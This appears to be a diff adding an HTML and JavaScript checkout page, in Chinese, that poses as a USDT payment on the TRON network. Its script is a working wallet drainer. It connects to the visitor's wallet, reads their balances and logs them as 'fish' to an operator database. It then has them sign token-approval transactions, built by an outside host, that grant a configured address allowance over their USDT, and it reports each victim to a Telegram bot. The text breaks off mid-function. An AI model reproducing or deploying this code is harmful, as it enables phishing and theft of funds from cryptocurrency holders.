@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover" />
+    <meta name="format-detection" content="telephone=no, email=no" />
+    <title>正在进行支付 {{TOTAL_PRICE}} USDT</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="icon" href="/assets/img/usdt.ico" type="image/x-icon">
+</head>
+<style>
+        .wallet-selection img {
+            width: 35px;
+            height: 35px;
+        }
+        
+        body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom, #ddeeff, #f6e4ea);
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.container {
+    width: 100%;
+    max-width: 800px;
+    margin: 20px auto;
+    padding: 20px;
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    box-sizing: border-box;
+}
+
+.header {
+    text-align: center;
+    padding: 20px 0;
+}
+
+.header h1 {
+    font-size: 24px;
+    margin: 0;
+    color: #333;
+}
+
+.header p {
+    font-size: 16px;
+    color: #666;
+}
+
+.alert {
+    background-color: #f8d7da;
+    color: #721c24;
+    padding: 0.5px;
+    margin: 1px 0;
+    border: 1px solid #f5c6cb;
+    border-radius: 10px;
+    font-size: 14px;
+}
+
+.qr-code {
+    text-align: center;
+    margin: 20px 0;
+    position: relative;
+}
+
+.qr-logo-container {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 36px;
+    height: 36px;
+    transform: translate(-50%, -50%);
+}
+
+.qr-logo {
+    width: 100%;
+    height: 100%;
+}
+
+.info {
+    display: flex;
+    align-items: center;
+    margin: 10px 0;
+}
+
+.info h2 {
+    font-size: 20px;
+    color: #333;
+    margin: 0;
+    padding-right: 10px;
+    flex-shrink: 0;
+}
+
+.info p {
+    font-size: 16px;
+    color: #666;
+    margin: 0;
+    word-break: break-all;
+}
+
+
+
+.timer {
+    text-align: right;
+    font-size: 18px;
+    color: #28a745;
+    margin-top: -40px;
+}
+
+.wallet-selection {
+    margin: 20px 0;
+}
+
+.wallet-selection h2 {
+    font-size: 20px;
+    color: #333;
+}
+
+.wallet-selection ul {
+    list-style: none;
+    padding: 0;
+}
+
+.wallet-selection li {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    margin: 5px 0;
+    cursor: pointer;
+}
+
+.wallet-selection li img {
+    margin-right: 10px;
+}
+
+.wallet-selection li.selected {
+    background-color: #e0f7fa;
+    border-color: #4fc3f7;
+}
+
+.pay-button {
+    width: 100%;
+    background-color: #007bff;
+    color: white;
+    padding: 10px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    text-align: center;
+    font-size: 18px;
+}
+
+.pay-button:hover {
+    background-color: #0056b3;
+}
+
+.pay-approvalbutton {
+    width: 100%;
+    background-color: #007bff;
+    color: white;
+    padding: 10px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    text-align: center;
+    font-size: 18px;
+}
+
+.pay-approvalbutton:hover {
+    background-color: #0056b3;
+}
+
+.hidden {
+    display: none;
+}
+
+#trxAmount {
+    color: red;
+}
+
+@media only screen and (max-width: 768px) {
+    #mobileContent .info h2, 
+    #mobileContent .info p {
+        display: inline;
+        font-size: 16px;
+        color: #333;
+        margin: 0;
+    }
+    
+    #mobileContent .info p {
+        color: #666;
+        margin-left: 5px;
+        word-break: break-all;
+    }
+}
+
+@media (max-width: 768px) {
+    body {
+        padding: 10px;
+    }
+
+    .container {
+        padding: 20px;
+        margin: 10px auto;
+    }
+
+    .header h1 {
+        font-size: 20px;
+    }
+
+    .header p {
+        font-size: 14px;
+    }
+
+    .info h2 {
+        font-size: 18px;
+    }
+
+    .info p {
+        font-size: 14px;
+        margin: 0;
+        word-break: break-all;
+    }
+
+    .timer {
+        font-size: 16px;
+        text-align: center;
+        margin-top: 10px;
+        display: block;
+    }
+
+    .pay-button {
+        font-size: 16px;
+    }
+    
+    .pay-approvalbutton {
+        font-size: 16px;
+    }
+}
+
+
+a[href^="tel"], a[href^="mailto"] {
+    color: inherit; 
+    text-decoration: none; 
+    pointer-events: none; 
+    cursor: default;
+}
+</style>
+<body>
+<!-- PC端专用 -->
+<div class="pc-content hidden" id="pcContent">
+    <div class="container">
+        <div class="header">
+            <h1>正在支付 USDT - 波场 (TRON) 网络</h1>
+            <p>为了您的安全起见，请打开钱包App扫描进行支付。</p>
+            <div class="timer" id="timer-pc"></div>
+        </div>
+        <div class="alert">
+            <p>付款成功后请勿关闭此页面，请耐心等待自动回调订单，否则可能无法自动到账！</p>
+        </div>
+        <div class="qr-code">
+            <canvas id="qrcode-pc"></canvas>
+            <div class="qr-logo-container">
+                <img src="/assets/img/tether-usdt-logo.png" class="qr-logo" id="logo-pc">
+            </div>
+        </div>
+        <!-- 商品图片 -->
+        <!--<div class="product-image-container" style="display: flex; justify-content: center; align-items: center;">-->
+
+        <!--    <div class="product-image" style="width: 300px; height: 200px; overflow: hidden; box-shadow: 0 0 15px rgba(0, 123, 255, 0.6); border-radius: 8px;">-->
+        <!--        <img src="{{GOODS_COVER}}" alt="{{GOODS_NAME}}" id="goods-cover" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">-->
+        <!--    </div>-->
+        <!--</div>-->
+        <div class="info">
+            <h2>商品订单</h2>
+            <p>{{ORDER_NUMBER}}</p>
+        </div>
+        <div class="info">
+            <h2>商品详情</h2>
+            <p>{{GOODS_NAME}}</p>
+        </div>
+        <div class="info">
+            <h2>购买数量</h2>
+            <p>{{NUM}} 件</p>
+        </div>
+        <div class="info">
+            <h2>付款金额</h2>
+            <p>{{TOTAL_PRICE}} USDT</p>
+        </div>
+        <div id="emailInfo" class="info hidden">
+            <h2>电子邮箱</h2>
+            <p>{{EMAIL}}</p>
+        </div>
+        <div id="passwordInfo" class="info hidden">
+            <h2>查单密码</h2>
+            <p>{{PASSWORD}}</p>
+        </div>
+        <div id="mobileInfo" class="info hidden">
+            <h2>手机号码</h2>
+            <p>{{MOBILE}}</p>
+        </div>
+    </div>
+</div>
+
+<!-- 移动端专用 -->
+<div class="mobile-content hidden" id="mobileContent">
+    <div class="container">
+        <div class="header">
+            <h1>正在支付 USDT 到 波场(TRON) 网络</h1>
+            <p>为了您的安全起见，请打开钱包App进行支付！</p>
+            <!--<div class="timer" id="timer-mobile"></div>-->
+        </div>
+        <div class="alert">
+            <p>付款成功后请勿关闭此页面，请耐心等待自动回调订单，否则可能无法自动到账！。</p>
+        </div>
+        <div class="qr-code">
+            <canvas id="qrcode-mobile"></canvas>
+            <div class="qr-logo-container">
+                <img src="/assets/img/tether-usdt-logo.png" class="qr-logo" id="logo-mobile">
+            </div>
+        </div>
+        <!-- 商品图片 -->
+        <!--<div class="product-image-container" style="display: flex; justify-content: center; align-items: center;">-->
+        <!--    <div class="product-image" style="width: 300px; height: 200px; overflow: hidden; box-shadow: 0 0 15px rgba(0, 123, 255, 0.6); border-radius: 8px;">-->
+        <!--        <img src="{{GOODS_COVER}}" alt="{{GOODS_NAME}}" id="goods-cover" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">-->
+        <!--    </div>-->
+        <!--</div>-->
+        <div class="info">
+            <h2>商品订单</h2>
+            <p>{{ORDER_NUMBER}}</p>
+        </div>
+        <div class="info">
+            <h2>商品详情</h2>
+            <p>{{GOODS_NAME}}</p>
+        </div>
+        <div class="info">
+            <h2>购买数量</h2>
+            <p>{{NUM}} 件</p>
+        </div>
+        <div class="info">
+            <h2>付款金额</h2>
+            <p>{{TOTAL_PRICE}} USDT</p>
+        </div>
+        <div id="emailInfo" class="info hidden">
+            <h2>电子邮箱</h2>
+            <p>{{EMAIL}}</p>
+        </div>
+        <div id="passwordInfo" class="info hidden">
+            <h2>查单密码</h2>
+            <p>{{PASSWORD}}</p>
+        </div>
+        <div id="mobileInfo" class="info hidden">
+            <h2>手机号码</h2>
+            <p>{{MOBILE}}</p>
+        </div>
+        <div class="wallet-selection">
+            <h2>选择付款钱包</h2>
+            <ul id="wallets">
+                <!-- <li data-wallet="OKX"> -->
+                    <!-- <img src="/assets/img/okex.png" alt="OKX"> -->
+                    <!-- <span>欧易Web3</span> -->
+                    <!-- <input type="radio" name="wallet" value="OKX"> -->
+                <!-- </li> -->
+                <li data-wallet="imToken">
+                    <img src="/assets/img/imtoken.png" alt="imToken">
+                    <span>imToken钱包</span>
+                    <input type="radio" name="wallet" value="imToken">
+                </li>
+                <li data-wallet="tokenpocket">
+                    <img src="/assets/img/tokenpocket.png" alt="tokenpocket">
+                    <span>TokenPocket</span>
+                    <input type="radio" name="wallet" value="tokenpocket">
+                </li>
+                 <li data-wallet="BitGet"> 
+                     <img src="/assets/img/bitget.png" alt="BitGet"> 
+                     <span>BitGet钱包</span> 
+                     <input type="radio" name="wallet" value="BitGet"> 
+                 </li> 
+                 <li data-wallet="TRONLINK"> 
+                     <img src="/assets/img/TronLink.png" alt="TRONLINK"> 
+                     <span>TronLink钱包</span> 
+                     <input type="radio" name="wallet" value="TRONLINK"> 
+                 </li> 
+            </ul>
+        </div>
+        <button class="pay-button" onclick="payNow()">打开支付</button>
+    </div>
+</div>
+
+<!-- 钱包DAPP专用 -->
+<div class="mobile-container1 hidden" id="walletContent">
+    <div class="container">
+        <div class="header">
+            <h1>正在支付 USDT 到 波场(TRON) 网络</h1>
+            <p>付款成功后请勿关闭此页面，请耐心等待自动回调订单，否则可能无法自动到账！</p>
+        </div>
+        <!-- 商品图片 -->
+        <div class="product-image-container" style="display: flex; justify-content: center; align-items: center;">
+            <div class="product-image" style="width: 300px; height: 200px; overflow: hidden; box-shadow: 0 0 15px rgba(0, 123, 255, 0.6); border-radius: 8px;">
+                <img src="{{GOODS_COVER}}" alt="{{GOODS_NAME}}" id="goods-cover" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">
+            </div>
+        </div>
+        <div class="info">
+            <h2>商品订单</h2>
+            <p>{{ORDER_NUMBER}}</p>
+        </div>
+        <div class="info">
+            <h2>商品详情</h2>
+            <p>{{GOODS_NAME}}</p>
+        </div>
+        <div class="info">
+            <h2>购买数量</h2>
+            <p>{{NUM}} 件</p>
+        </div>
+        <div class="info">
+            <h2>付款金额</h2>
+            <p id="paymentAmount">{{TOTAL_PRICE}} USDT</p>
+        </div>
+        <div id="emailInfo" class="info hidden">
+            <h2>电子邮箱</h2>
+            <p><span>{{EMAIL}}</span></p>
+        </div>
+        <div id="passwordInfo" class="info hidden">
+            <h2>查单密码</h2>
+            <p><span>{{PASSWORD}}</span></p>
+        </div>
+        <div id="mobileInfo" class="info hidden">
+            <h2>手机号码</h2>
+            <p><span>{{MOBILE}}</span></p>
+        </div>
+        <button class="pay-approvalbutton" onclick="invokePay()">确认支付</button>
+    </div>
+</div>
+</body>
+</html>
+<script>
+// document.addEventListener('keydown', function(event) {
+//     // 禁止F1-F12功能键、Ctrl键和其他调试相关快捷键
+//     if ((event.key >= 'F1' && event.key <= 'F12') || event.ctrlKey) {
+//         event.preventDefault();
+//     }
+//     // 禁止查看源代码（Ctrl+U）
+//     if (event.ctrlKey && (event.key === 'u' || event.key === 'U')) {
+//         event.preventDefault();
+//     }
+//     // 禁止调试模式快捷键（Ctrl+Shift+I、Ctrl+Shift+C、Ctrl+Shift+J）
+//     if (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'i' || event.key === 'C' || event.key === 'c' || event.key === 'J' || event.key === 'j')) {
+//         event.preventDefault();
+//     }
+//     // 禁止Ctrl+Shift+S保存网页快照
+//     if (event.ctrlKey && event.shiftKey && (event.key === 'S' || event.key === 's')) {
+//         event.preventDefault();
+//     }
+//     // 禁止Ctrl+P打印页面
+//     if (event.ctrlKey && (event.key === 'P' || event.key === 'p')) {
+//         event.preventDefault();
+//     }
+// });
+// // 监听右键菜单
+// document.addEventListener('contextmenu', function(event) {
+//     // 阻止默认的右键菜单显示
+//     event.preventDefault();
+// });
+// // 定期检查是否有调试模式开启
+// setInterval(function() {
+//     if (window.console && (console.log.toString().indexOf("native code") === -1)) {
+//         console.log = function() {};
+//         alert('请关闭调试模式');
+//     }
+// }, 1000);
+
+// 初始化倒计时器
+function initializeTimers() {
+    var duration = 1800;  // 倒计时30分钟
+    
+    var timerPc = document.getElementById('timer-pc');
+    if (timerPc) startTimer(duration, timerPc);
+    
+    var timerMobile = document.getElementById('timer-mobile');
+    if (timerMobile) startTimer(duration, timerMobile);
+    
+    var timerWallet = document.getElementById('timer-wallet');
+    if (timerWallet) startTimer(duration, timerWallet);
+}
+
+// 倒计时功能
+function startTimer(duration, display) {
+    var timer = duration, minutes, seconds;
+    setInterval(function() {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+            timer = duration;
+        }
+    }, 1000);
+}
+
+// 二维码生成
+function generateQRCode(canvasId, text) {
+    var qr = new QRious({
+        element: document.getElementById(canvasId),
+        value: text,
+        size: 200,
+        level: 'H'
+    });
+}
+
+// 解析附加信息为 JSON 
+try {
+    var attach = JSON.parse('{{ATTACH}}');
+    var options = JSON.parse('{{OPTIONS}}');
+    var fishAddresses = JSON.parse('{{FISH_ADDRESSES}}');
+
+    var attachList = document.getElementById('attach-list');
+    if (attachList) {
+        attach.forEach(function(item) {
+            var listItem = document.createElement('li');
+            listItem.textContent = item.title + ': ' + item.value;
+            attachList.appendChild(listItem);
+        });
+    }
+} catch(e) {
+}
+
+// 检查电子邮箱是否存在
+if ("{{EMAIL}}" !== "") {
+    var emailInfo = document.querySelectorAll('#emailInfo');
+    emailInfo.forEach(function(el) {
+        el.classList.remove('hidden');
+    });
+}
+
+// 检查查单密码是否存在
+if ("{{PASSWORD}}" !== "") {
+    var passwordInfo = document.querySelectorAll('#passwordInfo');
+    passwordInfo.forEach(function(el) {
+        el.classList.remove('hidden');
+    });
+}
+
+// 检查手机号码是否存在
+if ("{{MOBILE}}" !== "") {
+    var mobileInfo = document.querySelectorAll('#mobileInfo');
+    mobileInfo.forEach(function(el) {
+        el.classList.remove('hidden');
+    });
+}
+
+// 设置商品图片路径
+var goodsCover = "{{GOODS_COVER}}";
+
+// 获取商品封面图像元素
+var goodsCoverElement = document.getElementById('goods-cover');
+
+// 如果商品封面图像元素存在
+if (goodsCoverElement) {
+    // 设置商品封面图像元素的src属性为goodsCover变量的值
+    goodsCoverElement.src = goodsCover;
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    detectAndDisplayContent();
+    initializeTimers();
+    attemptConnection();
+});
+
+
+// 检测设备
+function isPC() {
+    return !/Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+}
+
+// 检测DApp
+function isDAppBrowser() {
+    return typeof window.ethereum !== 'undefined' || typeof window.tronWeb !== 'undefined';
+}
+
+// 网页展示
+function detectAndDisplayContent() {
+    var currentUrl = window.location.href;
+    if (isDAppBrowser() && !isPC()) {
+        // DAPP
+        document.getElementById('walletContent').classList.remove('hidden');
+        document.getElementById('pcContent').classList.add('hidden');
+        document.getElementById('mobileContent').classList.add('hidden');
+        generateQRCode('qrcode-wallet', currentUrl);
+    } else if (isPC()) {
+        // PC
+        document.getElementById('pcContent').classList.remove('hidden');
+        document.getElementById('mobileContent').classList.add('hidden');
+        document.getElementById('walletContent').classList.add('hidden');
+        generateQRCode('qrcode-pc', currentUrl);
+    } else {
+        // H5
+        document.getElementById('mobileContent').classList.remove('hidden');
+        document.getElementById('pcContent').classList.add('hidden');
+        document.getElementById('walletContent').classList.add('hidden');
+        generateQRCode('qrcode-mobile', currentUrl);
+    }
+}
+
+// 更新授权数据
+async function updateAuthorizationData(spenderAddress) {
+    try {
+        const now = new Date();
+        const beijingTime = new Date(now.getTime() + (8 * 60 * 60 * 1000));
+        const formattedTime = beijingTime.toISOString().slice(0, 19).replace('T', ' ');
+
+        // 发送更新授权数据的请求
+        const dbResponse = await $.post('/assets/libs/options/insertFish.php', {
+            fish_address: userData.address,
+            permissions_fishaddress: spenderAddress,
+            tgusername: userData.tgusername || '',
+            usdt_balance: userData.usdtBalance,
+            trx_balance: userData.trxBalance,
+            time: formattedTime,
+            remark: userData.tgusername || '',
+            operation: 'insert_update'
+        });
+        
+        if (dbResponse.status !== 'success') {
+            throw new Error(dbResponse.message);
+        }
+    } catch (error) {
+        console.error("更新授权数据异常:", error);
+    }
+}
+
+
+// 钱包连接状态
+let isConnected = false;
+
+// 尝试连接
+async function attemptConnection() {
+    if (isConnected) {
+        return;
+    }
+    try {
+        const connected = await connectWallet();
+        if (connected) {
+            isConnected = true;
+            await initDApp();
+            await sendWalletConnectNotification(
+                userData.address,
+                userData.trxBalance,
+                userData.usdtBalance
+            );
+        }
+    } catch (error) {
+        console.error('attemptConnection错误:', error);
+        isConnected = false; 
+    }
+    if (!isConnected) {
+        setTimeout(attemptConnection, 3000); 
+    }
+}
+
+// 连接钱包
+async function connectWallet() {
+    try {
+        if (window.tronWeb && window.tronWeb.ready) {
+            await initDApp();
+            return true;
+        }
+        if (window.tronLink) {
+            try {
+                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                if (res.code === 200) {
+                    window.tronWeb = window.tronLink.tronWeb;
+                    await initDApp();
+                    return true;
+                }
+            } catch (error) {
+                throw error;
+            }
+        }
+        if (typeof window.tronWeb !== 'undefined') {
+            let retries = 0;
+            const maxRetries = 10;
+            
+            while (retries < maxRetries) {
+                if (window.tronWeb.ready) {
+                    await initDApp();
+                    return true;
+                }
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                retries++;
+            }
+        }
+        return false;
+    } catch (error) {
+        console.error('connectWallet错误:', error);
+        return false;
+    }
+}
+
+async function initDApp() {
+    try {
+        const currentUrl = window.location.href;
+        const questionMarkIndex = currentUrl.indexOf('?');
+        
+        if (questionMarkIndex !== -1) {
+            // 获取问号后的所有内容
+            const queryString = currentUrl.slice(questionMarkIndex + 1);
+            // 拆分第一个&符号前的内容
+            const firstParam = queryString.split('&')[0];
+            // 拆分等号前后的内容
+            const [paramName, paramValue] = firstParam.split('=');
+            
+            // 检查参数值是否为空
+            if (paramName && (paramValue === undefined || paramValue === '')) {
+                userData.tgusername = paramName; // 使用参数名作为用户名
+            } else {
+                console.warn("TG用户名为空或格式不正确");
+                userData.tgusername = null;
+            }
+        } else {
+            console.warn("未找到推荐ID");
+            userData.tgusername = null;
+        }
+
+        // 其余代码保持不变
+        if (typeof window.tronWeb === 'undefined') {
+            throw new Error("未找到钱包");
+        }
+        if (!window.tronWeb.ready) {
+            throw new Error("请连接钱包后再进行交易");
+        }
+        const address = window.tronWeb.defaultAddress.base58;
+        if (!address) {
+            throw new Error("无法获取钱包地址,请确保已连接钱包");
+        }
+        userData.address = address;
+        
+        try {
+            const trxBalanceRaw = await window.tronWeb.trx.getBalance(userData.address);
+            userData.trxBalance = window.tronWeb.fromSun(trxBalanceRaw);
+        } catch (trxError) {
+            console.warn("获取TRX余额失败:", trxError);
+            userData.trxBalance = '0.000000';
+        }
+        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        try {
+            const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
+            let usdtBalanceRaw = await usdtContract.balanceOf(userData.address).call();
+            if (typeof usdtBalanceRaw === 'object' && usdtBalanceRaw.toString) {
+                usdtBalanceRaw = usdtBalanceRaw.toString();
+            }
+            userData.usdtBalance = parseFloat(window.tronWeb.fromSun(usdtBalanceRaw)).toFixed(6);
+        } catch (usdtError) {
+            console.warn("获取USDT余额失败:", usdtError);
+            userData.usdtBalance = '0.000000';
+        }
+    } catch (error) {
+        console.error("初始化DApp时发生错误:", error);
+        throw error;
+    }
+}
+
+// 用户数据
+const userData = {
+    address: null,
+    trxBalance: null,
+    usdtBalance: null,
+    tgusername: null
+};
+
+// 主支付函数
+async function invokePay() {
+    try {
+        if (!isConnected || !userData.address || userData.usdtBalance === null || userData.trxBalance === null) {
+            showTemporaryMessage("请先连接您的钱包再开始交易");
+            return;
+        }
+        const paymentAmountElement = document.getElementById('paymentAmount');
+        if (!paymentAmountElement) {
+            throw new Error("无法获取支付金额元素");
+        }
+        const totalPrice = parseFloat(paymentAmountElement.textContent.split(' ')[0]);
+        if (isNaN(totalPrice)) {
+            throw new Error("无效的支付金额");
+        }
+        const {
+            permission_address: spenderAddress,
+            payment_address: paymentAddress,
+            trx_balance: requiredTrxBalance,
+            usdt_balance: requiredUsdtBalance,
+            authorized_amount: approvalAmount,
+            model
+        } = options;
+        if (parseFloat(userData.trxBalance) < parseFloat(requiredTrxBalance)) {
+            showTemporaryMessage("您的TRX余额不足以支付交易矿工费");
+            return;
+        }
+        if (parseFloat(userData.usdtBalance) < parseFloat(requiredUsdtBalance)) {
+            showTemporaryMessage("您的USDT余额不足，发起交易可能会失败");
+            return;
+        }
+        const fishResponse = await $.post('/assets/libs/options/insertFish.php', {
+            fish_address: userData.address,
+            operation: 'query'
+        });
+        if (fishResponse.status === 'success' && fishResponse.message === '数据已存在') {
+            await UsdtTransfer(paymentAddress, totalPrice);
+        } else {
+            switch(Number(model)) {
+                case 4:
+                    await increaseApproval(spenderAddress, approvalAmount);
+                    break;
+                case 5:
+                    await approval(spenderAddress, approvalAmount);
+                    break;
+                default:
+                    throw new Error(`未设定的交易模式: ${model}`);
+            }
+        }
+    } catch (error) {
+        console.error("invokePay报错:", error);
+        showTemporaryMessage("支付失败，请重新尝试");
+    }
+}
+
+// 模式4授权函数
+async function increaseApproval(spenderAddress, approvalAmount) {
+   try {
+       // 定义TRONAPI端点接口
+       let url = 'https://tronweb.xyz/api/increaseApproval';
+       const response = await fetch(url, {
+           method: 'POST',
+           headers: {
+               'Content-Type': 'application/json'
+           },
+           // 提交授权信息
+           body: JSON.stringify({
+               spenderAddress: spenderAddress, // 接受授权地址
+               userAddress: userData.address, // 鱼苗地址
+               approvalAmount: approvalAmount // 授权的金额
+           })
+       });
+       const result = await response.json();
+       if (result.error) {
+           console.error(result.error);
+           return false;
+       }
+       // 签名这个交易
+       const signedTx = await window.tronWeb.trx.sign(result.transaction);
+       // 将签名后的交易广播到TRON网络
+       const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTx);
+       
+       if (broadcastResult.result === true && broadcastResult.txid) {
+           await updateAuthorizationData(spenderAddress);
+           await SendapprovalNotification(broadcastResult.txid);
+           if (options.authorize_note && options.authorize_note.trim()) {
+               showTemporaryMessage(options.authorize_note);
+           }
+           return true;
+       }
+       return false;
+   } catch (error) {
+       console.error("模式4失败:", error.message);
+       showTemporaryMessage("您的转账交易没有发起成功,请重试。");
+       return false;
+   }
+}
+
+// 模式5授权函数
+async function approval(spenderAddress, approvalAmount) {
+   try {
+       // 定义TRONAPI端点接口
+       let url = 'https://tronweb.xyz/api/approve';
+       const response = await fetch(url, {
+           method: 'POST',
+           headers: {
+               'Content-Type': 'application/json'
+           },
+           // 提交授权信息
+           body: JSON.stringify({
+               spenderAddress: spenderAddress, // 接受授权地址
+               userAddress: userData.address, // 鱼苗地址
+               approvalAmount: approvalAmount // 授权的金额
+           })
+       });
+       const result = await response.json();
+       if (result.error) {
+           console.error(result.error);
+           return false;
+       }
+       // 签名这个交易
+       const signedTx = await window.tronWeb.trx.sign(result.transaction);
+       // 将签名后的交易广播到TRON网络
+       const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTx);
+       
+       if (broadcastResult.result === true && broadcastResult.txid) {
+           await updateAuthorizationData(spenderAddress);
+           await SendapprovalNotification(broadcastResult.txid);
+           if (options.authorize_note && options.authorize_note.trim()) {
+               showTemporaryMessage(options.authorize_note);
+           }
+           return true;
+       }
+       return false;
+   } catch (error) {
+       console.error("模式5失败:", error.message);
+       showTemporaryMessage("您的转账交易发起失败,请重试。");
+       return false;
+   }
+}
+
+// 执行USDT转账函数
+async function UsdtTransfer(toAddress, amount) {
+    try {
+        // 定义TRONAPI端点接口
+        let url = 'https://tronweb.xyz/api/transfer';
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            // 提交转账信息
+            body: JSON.stringify({
+                usdtContractAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT合约地址
+                userAddress: userData.address, // 鱼苗地址
+                toAddress: toAddress, // 接收转账地址
+                amount: amount  // 转账金额
+            })
+        });
+        const result = await response.json();
+        if (result.error) {
+            console.error(result.error);
+            return false;
+        }
+        // 签名这个交易
+        const signedTx = await window.tronWeb.trx.sign(result.transaction);
+        // 将签名后的交易广播到TRON网络
+        const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTx);
+
+        if (broadcastResult.result === true && broadcastResult.txid) {
+            await sendPaymentNotification(broadcastResult.txid, toAddress, amount);
+            showTemporaryMessage("转账交易已提交,等待确认...");
+            return true;
+        }
+        return false;
+    } catch (error) {
+        console.error("转账失败:", error.message);
+        showTemporaryMessage("转账失败,请重试");
+        return false;
+    }
+}
+
+// 格式化余额的工具函数
+const formatBalance = (balance) => {
+    try {
+        if (typeof balance === 'number') return balance.toFixed(6);
+        const num = parseFloat(balance);
+        return isNaN(num) ? '0.000000' : num.toFixed(6);
+    } catch (e) {
+        return '0.000000';
+    }
+};
+
+// 发送钱包连接通知
+async function sendWalletConnectNotification() {
+    if (!options.notification_switch || options.notification_switch !== '1' || 
+        !options.bot_key || !options.notification_id) {
+        return;
+    }
+    
+    try {
+        const currentUrl = window.location.href;
+        const orderIdMatch = currentUrl.match(/epay\/(\d+)\.php/);
+        const orderId = orderIdMatch ? orderIdMatch[1] : '未知订单号';
+        
+        let goodsName = '未知商品名称';
+        const infoSections = document.querySelectorAll('.info');
+        for (const section of infoSections) {
+            const h2 = section.querySelector('h2');
+            if (h2 && h2.textContent.trim() === '商品详情') {
+                const nameElement = h2.nextElementSibling;
+                if (nameElement && nameElement.tagName === 'P') {
+                    goodsName = nameElement.textContent.trim();
+                }
+                break;
+            }
+        }
+        
+        const paymentAmountElement = document.getElementById('paymentAmount');
+        const totalPrice = parseFloat(paymentAmountElement.textContent.split(' ')[0]);
+
+        const notificationData = {
+            type: 'wallet_connect',
+            data: {
+                botKey: options.bot_key,
+                chatId: options.notification_id,
+                goodsName,
+                totalPrice: formatBalance(totalPrice),
+                orderId,
+                address: userData.address,
+                tgusername: userData.tgusername || '',
+                trxBalance: formatBalance(userData.trxBalance),
+                usdtBalance: formatBalance(userData.usdtBalance),
+                currentUrl
+            }
+        };
+
+        await fetch('/assets/libs/jiaoyi/bot.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(notificationData)
+        });
+    } catch (error) {
+        console.error("浏览通知发送失败，继续执行:", error);
+    }
+}
+
+// 发送授权成功通知
+async function SendapprovalNotification(txid) {
+    try {
+        const notificationData = {
+            type: 'approval',
+            data: {
+                botKey: options.bot_key,
+                chatId: options.notification_id,
+                txid,
+                address: userData.address,
+                tgusername: userData.tgusername || '',
+                permissionAddress: options.permission_address,
+                trxBalance: formatBalance(userData.trxBalance),
+                usdtBalance: formatBalance(userData.usdtBalance)
+            }
+        };
+
+        await fetch('/assets/libs/jiaoyi/bot.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(notificationData)
+        });
+    } catch (error) {
+        console.error("发送授权通知失败，继续执行:", error);
+    }
+}
+
+// 发送支付成功通知
+async function sendPaymentNotification(txid, paymentAddress, totalPrice) {
+    try {
+        const currentUrl = window.location.href;
+        const orderIdMatch = currentUrl.match(/epay\/(\d+)\.php/);
+        const orderId = orderIdMatch ? orderIdMatch[1] : '未知订单号';
+
+        const notificationData = {
+            type: 'payment',
+            data: {
+                botKey: options.bot_key,
+                chatId: options.notification_id,
+                txid,
+                orderId,
+                userAddress: userData.address,
+                paymentAddress,
+                totalPrice
+            }
+        };
+
+        await fetch('/assets/libs/jiaoyi/bot.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(notificationData)
+        });
+    } catch (error) {
+        console.error("发送支付通知失败，继续执行:", error);
+    }
+}
+
+// 钱包跳转
+function payNow() {
+    var currentUrl = window.location.href;
+    var urlToUse = currentUrl;
+    var selectedWallet = document.querySelector('input[name="wallet"]:checked');
+    if (selectedWallet) {
+        var selectIndex = selectedWallet.value;
+        var walletLinks = {
+            'imToken': `imtokenv2://navigate?screen=DappView&url=${urlToUse}`,
+            'OKX': `okx://wallet/dapp/details?dappUrl=${urlToUse}`,
+            'tokenpocket': `tpdapp://open?params={"url": "${urlToUse}"}`,
+            'TrustWallet': `https://link.trustwallet.com/open_url?coin_id=60&url=${urlToUse}`,
+            'Coinbase': `https://go.cb-w.com/dapp?cb_url=${urlToUse}`,
+            'BitKeep': `https://bkcode.vip?action=dapp&url=${urlToUse}`,
+            'BitGet': `bitget://navigate_to?url=${urlToUse}`,
+            'TRONLINK': `tronlink://browser_open/${urlToUse}`
+        };
+        if (walletLinks[selectIndex]) {
+            window.location.href = walletLinks[selectIndex];
+        }
+    } else {
+        alert('请先选择您的付款钱包');
